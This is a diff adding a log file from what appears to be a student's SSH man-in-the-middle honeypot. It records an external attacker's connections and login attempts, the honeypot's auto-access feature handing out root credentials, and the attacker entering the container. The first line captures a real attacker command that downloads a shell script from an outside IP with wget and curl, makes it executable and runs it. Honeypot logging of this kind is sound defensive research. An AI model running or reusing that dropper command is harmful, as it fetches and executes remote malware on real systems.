@@ -1,0 +1,49 @@
+
+2022-10-23 00:49:44.736 - [Debug] [EXEC] Noninteractive mode attacker command: cd /tmp; rm -rf wget*; wget http://179.43.175.5/wget.sh; curl -O http://179.43.175.5/wget.sh; chmod 777 wget.sh; ./wget.sh server; sh wget.sh server
+{"level":"error","message":"Forever detected script was killed by signal: SIGKILL"}
+(node:2974097) Warning: Accessing non-existent property 'padLevels' of module exports inside circular dependency
+(Use `node --trace-warnings ...` to show where the warning was created)
+Started with the following options:
+{
+  debug: true,
+  mitmIp: '10.0.3.1',
+  autoAccess: true,
+  autoAccessCache: 5000,
+  maxAttemptsPerConnection: 6,
+  sshServerIdentifier: 'SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2',
+  containerMountPathPrefix: '/var/lib/lxc',
+  containerMountPathSuffix: 'rootfs/',
+  loggingAttackerStreams: '/home/student/MITM/logs/session_streams',
+  loggingAuthenticationAttempts: '/home/student/MITM/logs/authentication_attempts',
+  loggingLogins: '/home/student/MITM/logs/logins',
+  loggingKeystrokes: '/home/student/MITM/logs/keystrokes',
+  containerName: 'DATABASE_3',
+  containerIp: '10.0.3.176',
+  mitmPort: 1002,
+  autoAccessFixed: 1
+}
+2022-10-23 00:50:13.457 - [Info] MITM Version: 2
+2022-10-23 00:50:13.458 - [Info] Auto Access Enabled: true
+2022-10-23 00:50:13.459 - [Debug] [Init] Auto Access Theshold Achieved: false
+2022-10-23 00:50:13.465 - [Info] SSH man-in-the-middle server for 10.0.3.176 listening on 10.0.3.1:1002
+2022-10-23 00:50:54.046 - [Debug] [Connection] Attacker connected: 35.234.67.16 | Client Identification: SSH-2.0-Go
+2022-10-23 00:50:58.610 - [Debug] [Connection] Attacker connected: 35.234.67.16 | Client Identification: SSH-2.0-Go
+2022-10-23 00:50:58.611 - [Debug] [Connection] Attacker connected: 35.234.67.16 | Client Identification: SSH-2.0-Go
+2022-10-23 00:51:08.942 - [Debug] [Auth] Attacker 35.234.67.16 trying to authenticate with 'none'
+2022-10-23 00:51:08.942 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2022-10-23 00:51:17.654 - [Debug] [Auth] Attacker 35.234.67.16 trying to authenticate with 'password'
+2022-10-23 00:51:17.656 - [Debug] [Auto Access] Attacker: 35.234.67.16, Threshold: 1, Attempts: 1
+2022-10-23 00:51:17.656 - [Debug] [Auto Access] Compromising the honeypot
+2022-10-23 00:51:17.656 - [Debug] [Auto Access] Adding the following credentials: 'root:!#%QET'
+2022-10-23 00:51:17.712 - [Debug] [Auto Access] Auto-access is now disabled for the remainder of this MITM server instance
+2022-10-23 00:51:17.714 - [Debug] [Auth] Valid credentials - Password Authentication
+2022-10-23 00:51:17.714 - [Debug] [LXC] Attempting to connect to the honeypot: 10.0.3.176
+2022-10-23 00:51:17.769 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2022-10-23 00:51:18.191 - [Debug] [Auth] Attacker 35.234.67.16 trying to authenticate with 'none'
+2022-10-23 00:51:18.191 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2022-10-23 00:51:21.356 - [Debug] [Auth] Attacker 35.234.67.16 trying to authenticate with 'password'
+2022-10-23 00:51:21.357 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2022-10-23 00:51:21.357 - [Debug] [Auth] Attacker: 35.234.67.16 has so far made 1 attempts. Remaining: 5 attempts
+2022-10-23 00:51:21.754 - [Debug] [Auth] Attacker 35.234.67.16 trying to authenticate with 'none'
+2022-10-23 00:51:21.755 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2022-10-23 00:51:23.906 - [Debug] [Connection] Attacker closed the connection
